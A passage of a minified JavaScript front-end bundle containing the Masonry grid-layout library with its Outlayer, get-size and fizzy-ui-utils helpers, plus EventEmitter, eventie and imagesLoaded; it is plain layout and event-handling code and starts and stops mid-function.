            for (var c = l.isBorderBox = "border-box" == s.boxSizing, d = 0; a > d; d++) {
                var u = r[d], h = s[u], p = parseFloat(h);
                l[u] = isNaN(p) ? 0 : p
            }
            var f = l.paddingLeft + l.paddingRight, g = l.paddingTop + l.paddingBottom,
                m = l.marginLeft + l.marginRight, v = l.marginTop + l.marginBottom,
                y = l.borderLeftWidth + l.borderRightWidth, _ = l.borderTopWidth + l.borderBottomWidth, w = c && o,
                b = t(s.width);
            !1 !== b && (l.width = b + (w ? 0 : f + y));
            var x = t(s.height);
            return !1 !== x && (l.height = x + (w ? 0 : g + _)), l.innerWidth = l.width - (f + y), l.innerHeight = l.height - (g + _), l.outerWidth = l.width + m, l.outerHeight = l.height + v, l
        }
    }

    var o, s = "undefined" == typeof console ? function () {
        } : function (t) {
            console.error(t)
        },
        r = ["paddingLeft", "paddingRight", "paddingTop", "paddingBottom", "marginLeft", "marginRight", "marginTop", "marginBottom", "borderLeftWidth", "borderRightWidth", "borderTopWidth", "borderBottomWidth"],
        a = r.length, l = !1;
    return n
})), function (t, e) {
    "use strict";
    "function" == typeof define && define.amd ? define("matches-selector/matches-selector", e) : "object" == typeof module && module.exports ? module.exports = e() : t.matchesSelector = e()
}(window, (function () {
    "use strict";
    var t = function () {
        var t = Element.prototype;
        if (t.matches) return "matches";
        if (t.matchesSelector) return "matchesSelector";
        for (var e = ["webkit", "moz", "ms", "o"], i = 0; i < e.length; i++) {
            var n = e[i] + "MatchesSelector";
            if (t[n]) return n
        }
    }();
    return function (e, i) {
        return e[t](i)
    }
})), function (t, e) {
    "use strict";
    "function" == typeof define && define.amd ? define("fizzy-ui-utils/utils", ["matches-selector/matches-selector"], (function (i) {
        return e(t, i)
    })) : "object" == typeof module && module.exports ? module.exports = e(t, require("desandro-matches-selector")) : t.fizzyUIUtils = e(t, t.matchesSelector)
}(window, (function (t, e) {
    var i = {
        extend: function (t, e) {
            for (var i in e) t[i] = e[i];
            return t
        }, modulo: function (t, e) {
            return (t % e + e) % e
        }, makeArray: function (t) {
            var e = [];
            if (Array.isArray(t)) e = t; else if (t && "number" == typeof t.length) for (var i = 0; i < t.length; i++) e.push(t[i]); else e.push(t);
            return e
        }, removeFrom: function (t, e) {
            var i = t.indexOf(e);
            -1 != i && t.splice(i, 1)
        }, getParent: function (t, i) {
            for (; t != document.body;) if (t = t.parentNode, e(t, i)) return t
        }, getQueryElement: function (t) {
            return "string" == typeof t ? document.querySelector(t) : t
        }, handleEvent: function (t) {
            var e = "on" + t.type;
            this[e] && this[e](t)
        }, filterFindElements: function (t, n) {
            t = i.makeArray(t);
            var o = [];
            return t.forEach((function (t) {
                if (t instanceof HTMLElement) {
                    if (!n) return void o.push(t);
                    e(t, n) && o.push(t);
                    for (var i = t.querySelectorAll(n), s = 0; s < i.length; s++) o.push(i[s])
                }
            })), o
        }, debounceMethod: function (t, e, i) {
            var n = t.prototype[e], o = e + "Timeout";
            t.prototype[e] = function () {
                var t = this[o];
                t && clearTimeout(t);
                var e = arguments, s = this;
                this[o] = setTimeout((function () {
                    n.apply(s, e), delete s[o]
                }), i || 100)
            }
        }, docReady: function (t) {
            "complete" == document.readyState ? t() : document.addEventListener("DOMContentLoaded", t)
        }, toDashed: function (t) {
            return t.replace(/(.)([A-Z])/g, (function (t, e, i) {
                return e + "-" + i
            })).toLowerCase()
        }
    }, n = t.console;
    return i.htmlInit = function (e, o) {
        i.docReady((function () {
            var s = i.toDashed(o), r = "data-" + s, a = document.querySelectorAll("[" + r + "]"),
                l = document.querySelectorAll(".js-" + s), c = i.makeArray(a).concat(i.makeArray(l)),
                d = r + "-options", u = t.jQuery;
            c.forEach((function (t) {
                var i, s = t.getAttribute(r) || t.getAttribute(d);
                try {
                    i = s && JSON.parse(s)
                } catch (e) {
                    return void (n && n.error("Error parsing " + r + " on " + t.className + ": " + e))
                }
                var a = new e(t, i);
                u && u.data(t, o, a)
            }))
        }))
    }, i
})), function (t, e) {
    "function" == typeof define && define.amd ? define("outlayer/item", ["ev-emitter/ev-emitter", "get-size/get-size"], (function (i, n) {
        return e(t, i, n)
    })) : "object" == typeof module && module.exports ? module.exports = e(t, require("ev-emitter"), require("get-size")) : (t.Outlayer = {}, t.Outlayer.Item = e(t, t.EvEmitter, t.getSize))
}(window, (function (t, e, i) {
    "use strict";

    function n(t, e) {
        t && (this.element = t, this.layout = e, this.position = {x: 0, y: 0}, this._create())
    }

    var o = document.documentElement.style, s = "string" == typeof o.transition ? "transition" : "WebkitTransition",
        r = "string" == typeof o.transform ? "transform" : "WebkitTransform",
        a = {WebkitTransition: "webkitTransitionEnd", transition: "transitionend"}[s],
        l = [r, s, s + "Duration", s + "Property"], c = n.prototype = Object.create(e.prototype);
    c.constructor = n, c._create = function () {
        this._transn = {ingProperties: {}, clean: {}, onEnd: {}}, this.css({position: "absolute"})
    }, c.handleEvent = function (t) {
        var e = "on" + t.type;
        this[e] && this[e](t)
    }, c.getSize = function () {
        this.size = i(this.element)
    }, c.css = function (t) {
        var e = this.element.style;
        for (var i in t) {
            e[l[i] || i] = t[i]
        }
    }, c.getPosition = function () {
        var t = getComputedStyle(this.element), e = this.layout._getOption("originLeft"),
            i = this.layout._getOption("originTop"), n = t[e ? "left" : "right"], o = t[i ? "top" : "bottom"],
            s = this.layout.size, r = -1 != n.indexOf("%") ? parseFloat(n) / 100 * s.width : parseInt(n, 10),
            a = -1 != o.indexOf("%") ? parseFloat(o) / 100 * s.height : parseInt(o, 10);
        r = isNaN(r) ? 0 : r, a = isNaN(a) ? 0 : a, r -= e ? s.paddingLeft : s.paddingRight, a -= i ? s.paddingTop : s.paddingBottom, this.position.x = r, this.position.y = a
    }, c.layoutPosition = function () {
        var t = this.layout.size, e = {}, i = this.layout._getOption("originLeft"),
            n = this.layout._getOption("originTop"), o = i ? "paddingLeft" : "paddingRight", s = i ? "left" : "right",
            r = i ? "right" : "left", a = this.position.x + t[o];
        e[s] = this.getXValue(a), e[r] = "";
        var l = n ? "paddingTop" : "paddingBottom", c = n ? "top" : "bottom", d = n ? "bottom" : "top",
            u = this.position.y + t[l];
        e[c] = this.getYValue(u), e[d] = "", this.css(e), this.emitEvent("layout", [this])
    }, c.getXValue = function (t) {
        var e = this.layout._getOption("horizontal");
        return this.layout.options.percentPosition && !e ? t / this.layout.size.width * 100 + "%" : t + "px"
    }, c.getYValue = function (t) {
        var e = this.layout._getOption("horizontal");
        return this.layout.options.percentPosition && e ? t / this.layout.size.height * 100 + "%" : t + "px"
    }, c._transitionTo = function (t, e) {
        this.getPosition();
        var i = this.position.x, n = this.position.y, o = parseInt(t, 10), s = parseInt(e, 10),
            r = o === this.position.x && s === this.position.y;
        if (this.setPosition(t, e), !r || this.isTransitioning) {
            var a = t - i, l = e - n, c = {};
            c.transform = this.getTranslate(a, l), this.transition({
                to: c,
                onTransitionEnd: {transform: this.layoutPosition},
                isCleaning: !0
            })
        } else this.layoutPosition()
    }, c.getTranslate = function (t, e) {
        return "translate3d(" + (t = this.layout._getOption("originLeft") ? t : -t) + "px, " + (e = this.layout._getOption("originTop") ? e : -e) + "px, 0)"
    }, c.goTo = function (t, e) {
        this.setPosition(t, e), this.layoutPosition()
    }, c.moveTo = c._transitionTo, c.setPosition = function (t, e) {
        this.position.x = parseInt(t, 10), this.position.y = parseInt(e, 10)
    }, c._nonTransition = function (t) {
        for (var e in this.css(t.to), t.isCleaning && this._removeStyles(t.to), t.onTransitionEnd) t.onTransitionEnd[e].call(this)
    }, c._transition = function (t) {
        if (parseFloat(this.layout.options.transitionDuration)) {
            var e = this._transn;
            for (var i in t.onTransitionEnd) e.onEnd[i] = t.onTransitionEnd[i];
            for (i in t.to) e.ingProperties[i] = !0, t.isCleaning && (e.clean[i] = !0);
            if (t.from) {
                this.css(t.from);
                this.element.offsetHeight;
                null
            }
            this.enableTransition(t.to), this.css(t.to), this.isTransitioning = !0
        } else this._nonTransition(t)
    };
    var d = "opacity," + function (t) {
        return t.replace(/([A-Z])/g, (function (t) {
            return "-" + t.toLowerCase()
        }))
    }(l.transform || "transform");
    c.enableTransition = function () {
        this.isTransitioning || (this.css({
            transitionProperty: d,
            transitionDuration: this.layout.options.transitionDuration
        }), this.element.addEventListener(a, this, !1))
    }, c.transition = n.prototype[s ? "_transition" : "_nonTransition"], c.onwebkitTransitionEnd = function (t) {
        this.ontransitionend(t)
    }, c.onotransitionend = function (t) {
        this.ontransitionend(t)
    };
    var u = {"-webkit-transform": "transform"};
    c.ontransitionend = function (t) {
        if (t.target === this.element) {
            var e = this._transn, i = u[t.propertyName] || t.propertyName;
            if (delete e.ingProperties[i], function (t) {
                for (var e in t) return !1;
                return !0
            }(e.ingProperties) && this.disableTransition(), i in e.clean && (this.element.style[t.propertyName] = "", delete e.clean[i]), i in e.onEnd) e.onEnd[i].call(this), delete e.onEnd[i];
            this.emitEvent("transitionEnd", [this])
        }
    }, c.disableTransition = function () {
        this.removeTransitionStyles(), this.element.removeEventListener(a, this, !1), this.isTransitioning = !1
    }, c._removeStyles = function (t) {
        var e = {};
        for (var i in t) e[i] = "";
        this.css(e)
    };
    var h = {transitionProperty: "", transitionDuration: ""};
    return c.removeTransitionStyles = function () {
        this.css(h)
    }, c.removeElem = function () {
        this.element.parentNode.removeChild(this.element), this.css({display: ""}), this.emitEvent("remove", [this])
    }, c.remove = function () {
        return s && parseFloat(this.layout.options.transitionDuration) ? (this.once("transitionEnd", (function () {
            this.removeElem()
        })), void this.hide()) : void this.removeElem()
    }, c.reveal = function () {
        delete this.isHidden, this.css({display: ""});
        var t = this.layout.options, e = {};
        e[this.getHideRevealTransitionEndProperty("visibleStyle")] = this.onRevealTransitionEnd, this.transition({
            from: t.hiddenStyle,
            to: t.visibleStyle,
            isCleaning: !0,
            onTransitionEnd: e
        })
    }, c.onRevealTransitionEnd = function () {
        this.isHidden || this.emitEvent("reveal")
    }, c.getHideRevealTransitionEndProperty = function (t) {
        var e = this.layout.options[t];
        if (e.opacity) return "opacity";
        for (var i in e) return i
    }, c.hide = function () {
        this.isHidden = !0, this.css({display: ""});
        var t = this.layout.options, e = {};
        e[this.getHideRevealTransitionEndProperty("hiddenStyle")] = this.onHideTransitionEnd, this.transition({
            from: t.visibleStyle,
            to: t.hiddenStyle,
            isCleaning: !0,
            onTransitionEnd: e
        })
    }, c.onHideTransitionEnd = function () {
        this.isHidden && (this.css({display: "none"}), this.emitEvent("hide"))
    }, c.destroy = function () {
        this.css({position: "", left: "", right: "", top: "", bottom: "", transition: "", transform: ""})
    }, n
})), function (t, e) {
    "use strict";
    "function" == typeof define && define.amd ? define("outlayer/outlayer", ["ev-emitter/ev-emitter", "get-size/get-size", "fizzy-ui-utils/utils", "./item"], (function (i, n, o, s) {
        return e(t, i, n, o, s)
    })) : "object" == typeof module && module.exports ? module.exports = e(t, require("ev-emitter"), require("get-size"), require("fizzy-ui-utils"), require("./item")) : t.Outlayer = e(t, t.EvEmitter, t.getSize, t.fizzyUIUtils, t.Outlayer.Item)
}(window, (function (t, e, i, n, o) {
    "use strict";

    function s(t, e) {
        var i = n.getQueryElement(t);
        if (i) {
            this.element = i, l && (this.$element = l(this.element)), this.options = n.extend({}, this.constructor.defaults), this.option(e);
            var o = ++d;
            this.element.outlayerGUID = o, u[o] = this, this._create(), this._getOption("initLayout") && this.layout()
        } else a && a.error("Bad element for " + this.constructor.namespace + ": " + (i || t))
    }

    function r(t) {
        function e() {
            t.apply(this, arguments)
        }

        return e.prototype = Object.create(t.prototype), e.prototype.constructor = e, e
    }

    var a = t.console, l = t.jQuery, c = function () {
    }, d = 0, u = {};
    s.namespace = "outlayer", s.Item = o, s.defaults = {
        containerStyle: {position: "relative"},
        initLayout: !0,
        originLeft: !0,
        originTop: !0,
        resize: !0,
        resizeContainer: !0,
        transitionDuration: "0.4s",
        hiddenStyle: {opacity: 0, transform: "scale(0.001)"},
        visibleStyle: {opacity: 1, transform: "scale(1)"}
    };
    var h = s.prototype;
    return n.extend(h, e.prototype), h.option = function (t) {
        n.extend(this.options, t)
    }, h._getOption = function (t) {
        var e = this.constructor.compatOptions[t];
        return e && void 0 !== this.options[e] ? this.options[e] : this.options[t]
    }, s.compatOptions = {
        initLayout: "isInitLayout",
        horizontal: "isHorizontal",
        layoutInstant: "isLayoutInstant",
        originLeft: "isOriginLeft",
        originTop: "isOriginTop",
        resize: "isResizeBound",
        resizeContainer: "isResizingContainer"
    }, h._create = function () {
        this.reloadItems(), this.stamps = [], this.stamp(this.options.stamp), n.extend(this.element.style, this.options.containerStyle), this._getOption("resize") && this.bindResize()
    }, h.reloadItems = function () {
        this.items = this._itemize(this.element.children)
    }, h._itemize = function (t) {
        for (var e = this._filterFindItemElements(t), i = this.constructor.Item, n = [], o = 0; o < e.length; o++) {
            var s = new i(e[o], this);
            n.push(s)
        }
        return n
    }, h._filterFindItemElements = function (t) {
        return n.filterFindElements(t, this.options.itemSelector)
    }, h.getItemElements = function () {
        return this.items.map((function (t) {
            return t.element
        }))
    }, h.layout = function () {
        this._resetLayout(), this._manageStamps();
        var t = this._getOption("layoutInstant"), e = void 0 !== t ? t : !this._isLayoutInited;
        this.layoutItems(this.items, e), this._isLayoutInited = !0
    }, h._init = h.layout, h._resetLayout = function () {
        this.getSize()
    }, h.getSize = function () {
        this.size = i(this.element)
    }, h._getMeasurement = function (t, e) {
        var n, o = this.options[t];
        o ? ("string" == typeof o ? n = this.element.querySelector(o) : o instanceof HTMLElement && (n = o), this[t] = n ? i(n)[e] : o) : this[t] = 0
    }, h.layoutItems = function (t, e) {
        t = this._getItemsForLayout(t), this._layoutItems(t, e), this._postLayout()
    }, h._getItemsForLayout = function (t) {
        return t.filter((function (t) {
            return !t.isIgnored
        }))
    }, h._layoutItems = function (t, e) {
        if (this._emitCompleteOnItems("layout", t), t && t.length) {
            var i = [];
            t.forEach((function (t) {
                var n = this._getItemLayoutPosition(t);
                n.item = t, n.isInstant = e || t.isLayoutInstant, i.push(n)
            }), this), this._processLayoutQueue(i)
        }
    }, h._getItemLayoutPosition = function () {
        return {x: 0, y: 0}
    }, h._processLayoutQueue = function (t) {
        t.forEach((function (t) {
            this._positionItem(t.item, t.x, t.y, t.isInstant)
        }), this)
    }, h._positionItem = function (t, e, i, n) {
        n ? t.goTo(e, i) : t.moveTo(e, i)
    }, h._postLayout = function () {
        this.resizeContainer()
    }, h.resizeContainer = function () {
        if (this._getOption("resizeContainer")) {
            var t = this._getContainerSize();
            t && (this._setContainerMeasure(t.width, !0), this._setContainerMeasure(t.height, !1))
        }
    }, h._getContainerSize = c, h._setContainerMeasure = function (t, e) {
        if (void 0 !== t) {
            var i = this.size;
            i.isBorderBox && (t += e ? i.paddingLeft + i.paddingRight + i.borderLeftWidth + i.borderRightWidth : i.paddingBottom + i.paddingTop + i.borderTopWidth + i.borderBottomWidth), t = Math.max(t, 0), this.element.style[e ? "width" : "height"] = t + "px"
        }
    }, h._emitCompleteOnItems = function (t, e) {
        function i() {
            o.dispatchEvent(t + "Complete", null, [e])
        }

        function n() {
            ++r == s && i()
        }

        var o = this, s = e.length;
        if (e && s) {
            var r = 0;
            e.forEach((function (e) {
                e.once(t, n)
            }))
        } else i()
    }, h.dispatchEvent = function (t, e, i) {
        var n = e ? [e].concat(i) : i;
        if (this.emitEvent(t, n), l) if (this.$element = this.$element || l(this.element), e) {
            var o = l.Event(e);
            o.type = t, this.$element.trigger(o, i)
        } else this.$element.trigger(t, i)
    }, h.ignore = function (t) {
        var e = this.getItem(t);
        e && (e.isIgnored = !0)
    }, h.unignore = function (t) {
        var e = this.getItem(t);
        e && delete e.isIgnored
    }, h.stamp = function (t) {
        (t = this._find(t)) && (this.stamps = this.stamps.concat(t), t.forEach(this.ignore, this))
    }, h.unstamp = function (t) {
        (t = this._find(t)) && t.forEach((function (t) {
            n.removeFrom(this.stamps, t), this.unignore(t)
        }), this)
    }, h._find = function (t) {
        return t ? ("string" == typeof t && (t = this.element.querySelectorAll(t)), t = n.makeArray(t)) : void 0
    }, h._manageStamps = function () {
        this.stamps && this.stamps.length && (this._getBoundingRect(), this.stamps.forEach(this._manageStamp, this))
    }, h._getBoundingRect = function () {
        var t = this.element.getBoundingClientRect(), e = this.size;
        this._boundingRect = {
            left: t.left + e.paddingLeft + e.borderLeftWidth,
            top: t.top + e.paddingTop + e.borderTopWidth,
            right: t.right - (e.paddingRight + e.borderRightWidth),
            bottom: t.bottom - (e.paddingBottom + e.borderBottomWidth)
        }
    }, h._manageStamp = c, h._getElementOffset = function (t) {
        var e = t.getBoundingClientRect(), n = this._boundingRect, o = i(t);
        return {
            left: e.left - n.left - o.marginLeft,
            top: e.top - n.top - o.marginTop,
            right: n.right - e.right - o.marginRight,
            bottom: n.bottom - e.bottom - o.marginBottom
        }
    }, h.handleEvent = n.handleEvent, h.bindResize = function () {
        t.addEventListener("resize", this), this.isResizeBound = !0
    }, h.unbindResize = function () {
        t.removeEventListener("resize", this), this.isResizeBound = !1
    }, h.onresize = function () {
        this.resize()
    }, n.debounceMethod(s, "onresize", 100), h.resize = function () {
        this.isResizeBound && this.needsResizeLayout() && this.layout()
    }, h.needsResizeLayout = function () {
        var t = i(this.element);
        return this.size && t && t.innerWidth !== this.size.innerWidth
    }, h.addItems = function (t) {
        var e = this._itemize(t);
        return e.length && (this.items = this.items.concat(e)), e
    }, h.appended = function (t) {
        var e = this.addItems(t);
        e.length && (this.layoutItems(e, !0), this.reveal(e))
    }, h.prepended = function (t) {
        var e = this._itemize(t);
        if (e.length) {
            var i = this.items.slice(0);
            this.items = e.concat(i), this._resetLayout(), this._manageStamps(), this.layoutItems(e, !0), this.reveal(e), this.layoutItems(i)
        }
    }, h.reveal = function (t) {
        this._emitCompleteOnItems("reveal", t), t && t.length && t.forEach((function (t) {
            t.reveal()
        }))
    }, h.hide = function (t) {
        this._emitCompleteOnItems("hide", t), t && t.length && t.forEach((function (t) {
            t.hide()
        }))
    }, h.revealItemElements = function (t) {
        var e = this.getItems(t);
        this.reveal(e)
    }, h.hideItemElements = function (t) {
        var e = this.getItems(t);
        this.hide(e)
    }, h.getItem = function (t) {
        for (var e = 0; e < this.items.length; e++) {
            var i = this.items[e];
            if (i.element == t) return i
        }
    }, h.getItems = function (t) {
        t = n.makeArray(t);
        var e = [];
        return t.forEach((function (t) {
            var i = this.getItem(t);
            i && e.push(i)
        }), this), e
    }, h.remove = function (t) {
        var e = this.getItems(t);
        this._emitCompleteOnItems("remove", e), e && e.length && e.forEach((function (t) {
            t.remove(), n.removeFrom(this.items, t)
        }), this)
    }, h.destroy = function () {
        var t = this.element.style;
        t.height = "", t.position = "", t.width = "", this.items.forEach((function (t) {
            t.destroy()
        })), this.unbindResize();
        var e = this.element.outlayerGUID;
        delete u[e], delete this.element.outlayerGUID, l && l.removeData(this.element, this.constructor.namespace)
    }, s.data = function (t) {
        var e = (t = n.getQueryElement(t)) && t.outlayerGUID;
        return e && u[e]
    }, s.create = function (t, e) {
        var i = r(s);
        return i.defaults = n.extend({}, s.defaults), n.extend(i.defaults, e), i.compatOptions = n.extend({}, s.compatOptions), i.namespace = t, i.data = s.data, i.Item = r(o), n.htmlInit(i, t), l && l.bridget && l.bridget(t, i), i
    }, s.Item = o, s
})), function (t, e) {
    "function" == typeof define && define.amd ? define(["outlayer/outlayer", "get-size/get-size"], e) : "object" == typeof module && module.exports ? module.exports = e(require("outlayer"), require("get-size")) : t.Masonry = e(t.Outlayer, t.getSize)
}(window, (function (t, e) {
    var i = t.create("masonry");
    return i.compatOptions.fitWidth = "isFitWidth", i.prototype._resetLayout = function () {
        this.getSize(), this._getMeasurement("columnWidth", "outerWidth"), this._getMeasurement("gutter", "outerWidth"), this.measureColumns(), this.colYs = [];
        for (var t = 0; t < this.cols; t++) this.colYs.push(0);
        this.maxY = 0
    }, i.prototype.measureColumns = function () {
        if (this.getContainerWidth(), !this.columnWidth) {
            var t = this.items[0], i = t && t.element;
            this.columnWidth = i && e(i).outerWidth || this.containerWidth
        }
        var n = this.columnWidth += this.gutter, o = this.containerWidth + this.gutter, s = o / n, r = n - o % n;
        s = Math[r && 1 > r ? "round" : "floor"](s), this.cols = Math.max(s, 1)
    }, i.prototype.getContainerWidth = function () {
        var t = this._getOption("fitWidth") ? this.element.parentNode : this.element, i = e(t);
        this.containerWidth = i && i.innerWidth
    }, i.prototype._getItemLayoutPosition = function (t) {
        t.getSize();
        var e = t.size.outerWidth % this.columnWidth,
            i = Math[e && 1 > e ? "round" : "ceil"](t.size.outerWidth / this.columnWidth);
        i = Math.min(i, this.cols);
        for (var n = this._getColGroup(i), o = Math.min.apply(Math, n), s = n.indexOf(o), r = {
            x: this.columnWidth * s,
            y: o
        }, a = o + t.size.outerHeight, l = this.cols + 1 - n.length, c = 0; l > c; c++) this.colYs[s + c] = a;
        return r
    }, i.prototype._getColGroup = function (t) {
        if (2 > t) return this.colYs;
        for (var e = [], i = this.cols + 1 - t, n = 0; i > n; n++) {
            var o = this.colYs.slice(n, n + t);
            e[n] = Math.max.apply(Math, o)
        }
        return e
    }, i.prototype._manageStamp = function (t) {
        var i = e(t), n = this._getElementOffset(t), o = this._getOption("originLeft") ? n.left : n.right,
            s = o + i.outerWidth, r = Math.floor(o / this.columnWidth);
        r = Math.max(0, r);
        var a = Math.floor(s / this.columnWidth);
        a -= s % this.columnWidth ? 0 : 1, a = Math.min(this.cols - 1, a);
        for (var l = (this._getOption("originTop") ? n.top : n.bottom) + i.outerHeight, c = r; a >= c; c++) this.colYs[c] = Math.max(l, this.colYs[c])
    }, i.prototype._getContainerSize = function () {
        this.maxY = Math.max.apply(Math, this.colYs);
        var t = {height: this.maxY};
        return this._getOption("fitWidth") && (t.width = this._getContainerFitWidth()), t
    }, i.prototype._getContainerFitWidth = function () {
        for (var t = 0, e = this.cols; --e && 0 === this.colYs[e];) t++;
        return (this.cols - t) * this.columnWidth - this.gutter
    }, i.prototype.needsResizeLayout = function () {
        var t = this.containerWidth;
        return this.getContainerWidth(), t != this.containerWidth
    }, i
})),
    /*!
 * imagesLoaded PACKAGED v3.0.4
 * JavaScript is all like "You images are done yet or what?"
 */
    function () {
        "use strict";

        function t() {
        }

        function e(t, e) {
            for (var i = t.length; i--;) if (t[i].listener === e) return i;
            return -1
        }

        var i = t.prototype;
        i.getListeners = function (t) {
            var e, i, n = this._getEvents();
            if ("object" == typeof t) for (i in e = {}, n) n.hasOwnProperty(i) && t.test(i) && (e[i] = n[i]); else e = n[t] || (n[t] = []);
            return e
        }, i.flattenListeners = function (t) {
            var e, i = [];
            for (e = 0; t.length > e; e += 1) i.push(t[e].listener);
            return i
        }, i.getListenersAsObject = function (t) {
            var e, i = this.getListeners(t);
            return i instanceof Array && ((e = {})[t] = i), e || i
        }, i.addListener = function (t, i) {
            var n, o = this.getListenersAsObject(t), s = "object" == typeof i;
            for (n in o) o.hasOwnProperty(n) && -1 === e(o[n], i) && o[n].push(s ? i : {listener: i, once: !1});
            return this
        }, i.on = i.addListener, i.addOnceListener = function (t, e) {
            return this.addListener(t, {listener: e, once: !0})
        }, i.once = i.addOnceListener, i.defineEvent = function (t) {
            return this.getListeners(t), this
        }, i.defineEvents = function (t) {
            for (var e = 0; t.length > e; e += 1) this.defineEvent(t[e]);
            return this
        }, i.removeListener = function (t, i) {
            var n, o, s = this.getListenersAsObject(t);
            for (o in s) s.hasOwnProperty(o) && (-1 !== (n = e(s[o], i)) && s[o].splice(n, 1));
            return this
        }, i.off = i.removeListener, i.addListeners = function (t, e) {
            return this.manipulateListeners(!1, t, e)
        }, i.removeListeners = function (t, e) {
            return this.manipulateListeners(!0, t, e)
        }, i.manipulateListeners = function (t, e, i) {
            var n, o, s = t ? this.removeListener : this.addListener, r = t ? this.removeListeners : this.addListeners;
            if ("object" != typeof e || e instanceof RegExp) for (n = i.length; n--;) s.call(this, e, i[n]); else for (n in e) e.hasOwnProperty(n) && (o = e[n]) && ("function" == typeof o ? s.call(this, n, o) : r.call(this, n, o));
            return this
        }, i.removeEvent = function (t) {
            var e, i = typeof t, n = this._getEvents();
            if ("string" === i) delete n[t]; else if ("object" === i) for (e in n) n.hasOwnProperty(e) && t.test(e) && delete n[e]; else delete this._events;
            return this
        }, i.emitEvent = function (t, e) {
            var i, n, o, s = this.getListenersAsObject(t);
            for (o in s) if (s.hasOwnProperty(o)) for (n = s[o].length; n--;) ((i = s[o][n]).listener.apply(this, e || []) === this._getOnceReturnValue() || !0 === i.once) && this.removeListener(t, s[o][n].listener);
            return this
        }, i.trigger = i.emitEvent, i.emit = function (t) {
            var e = Array.prototype.slice.call(arguments, 1);
            return this.emitEvent(t, e)
        }, i.setOnceReturnValue = function (t) {
            return this._onceReturnValue = t, this
        }, i._getOnceReturnValue = function () {
            return !this.hasOwnProperty("_onceReturnValue") || this._onceReturnValue
        }, i._getEvents = function () {
            return this._events || (this._events = {})
        }, "function" == typeof define && define.amd ? define((function () {
            return t
        })) : "undefined" != typeof module && module.exports ? module.exports = t : this.EventEmitter = t
    }.call(this), function (t) {
    "use strict";
    var e = document.documentElement, i = function () {
    };
    e.addEventListener ? i = function (t, e, i) {
        t.addEventListener(e, i, !1)
    } : e.attachEvent && (i = function (e, i, n) {
        e[i + n] = n.handleEvent ? function () {
            var e = t.event;
            e.target = e.target || e.srcElement, n.handleEvent.call(n, e)
        } : function () {
            var i = t.event;
            i.target = i.target || i.srcElement, n.call(e, i)
        }, e.attachEvent("on" + i, e[i + n])
    });
    var n = function () {
    };
    e.removeEventListener ? n = function (t, e, i) {
        t.removeEventListener(e, i, !1)
    } : e.detachEvent && (n = function (t, e, i) {
        t.detachEvent("on" + e, t[e + i]);
        try {
            delete t[e + i]
        } catch (n) {
            t[e + i] = void 0
        }
    });
    var o = {bind: i, unbind: n};
    "function" == typeof define && define.amd ? define(o) : t.eventie = o
}(this), function (t) {
    "use strict";

    function e(t, e) {
        for (var i in e) t[i] = e[i];
        return t
    }

    function i(t) {
        var e = [];
        if (function (t) {
            return "[object Array]" === a.call(t)
        }(t)) e = t; else if ("number" == typeof t.length) for (var i = 0, n = t.length; n > i; i++) e.push(t[i]); else e.push(t);
        return e
    }

    function n(t, n) {
        function a(t, n, s) {
            if (!(this instanceof a)) return new a(t, n);
            "string" == typeof t && (t = document.querySelectorAll(t)), this.elements = i(t), this.options = e({}, this.options), "function" == typeof n ? s = n : e(this.options, n), s && this.on("always", s), this.getImages(), o && (this.jqDeferred = new o.Deferred);
            var r = this;
            setTimeout((function () {
                r.check()
            }))
        }

        function l(t) {
            this.img = t
        }

        a.prototype = new t, a.prototype.options = {}, a.prototype.getImages = function () {
            this.images = [];
            for (var t = 0, e = this.elements.length; e > t; t++) {
                var i = this.elements[t];
                "IMG" === i.nodeName && this.addImage(i);
                for (var n = i.querySelectorAll("img"), o = 0, s = n.length; s > o; o++) {
                    var r = n[o];
                    this.addImage(r)
                }
            }
        }, a.prototype.addImage = function (t) {
            var e = new l(t);
            this.images.push(e)
        }, a.prototype.check = function () {
            function t(t, o) {
                return e.options.debug && r && s.log("confirm", t, o), e.progress(t), ++i === n && e.complete(), !0
            }

            var e = this, i = 0, n = this.images.length;
            if (this.hasAnyBroken = !1, n) for (var o = 0; n > o; o++) {
                var a = this.images[o];
                a.on("confirm", t), a.check()
            } else this.complete()
        }, a.prototype.progress = function (t) {
            this.hasAnyBroken = this.hasAnyBroken || !t.isLoaded;
            var e = this;
            setTimeout((function () {
                e.emit("progress", e, t), e.jqDeferred && e.jqDeferred.notify(e, t)
            }))
        }, a.prototype.complete = function () {
            var t = this.hasAnyBroken ? "fail" : "done";
            this.isComplete = !0;
            var e = this;
            setTimeout((function () {
                if (e.emit(t, e), e.emit("always", e), e.jqDeferred) {
                    var i = e.hasAnyBroken ? "reject" : "resolve";
                    e.jqDeferred[i](e)
                }
            }))
        }, o && (o.fn.imagesLoaded = function (t, e) {
            return new a(this, t, e).jqDeferred.promise(o(this))
        });
        var c = {};
        return l.prototype = new t, l.prototype.check = function () {
            var t = c[this.img.src];
            if (t) this.useCached(t); else if (c[this.img.src] = this, this.img.complete && void 0 !== this.img.naturalWidth) this.confirm(0 !== this.img.naturalWidth, "naturalWidth"); else {
                var e = this.proxyImage = new Image;
                n.bind(e, "load", this), n.bind(e, "error", this), e.src = this.img.src
            }
        }, l.prototype.useCached = function (t) {
            if (t.isConfirmed) this.confirm(t.isLoaded, "cached was confirmed"); else {
                var e = this;
                t.on("confirm", (function (t) {
                    return e.confirm(t.isLoaded, "cache emitted confirmed"), !0
                }))
            }
        }, l.prototype.confirm = function (t, e) {
            this.isConfirmed = !0, this.isLoaded = t, this.emit("confirm", this, e)
        }, l.prototype.handleEvent = function (t) {
            var e = "on" + t.type;
            this[e] && this[e](t)
        }, l.prototype.onload = function () {
            this.confirm(!0, "onload"), this.unbindProxyEvents()
        }, l.prototype.onerror = function () {
            this.confirm(!1, "onerror"), this.unbindProxyEvents()
        }, l.prototype.unbindProxyEvents = function () {
            n.unbind(this.proxyImage, "load", this), n.unbind(this.proxyImage, "error", this)
        }, a
    }

    var o = t.jQuery, s = t.console, r = void 0 !== s, a = Object.prototype.toString;
    "function" == typeof define && define.amd ? define(["eventEmitter/EventEmitter", "eventie/eventie"], n) : t.imagesLoaded = n(t.EventEmitter, t.eventie)
}(window), function (t, e, i, n) {
    "use strict";

    function o(e, n) {
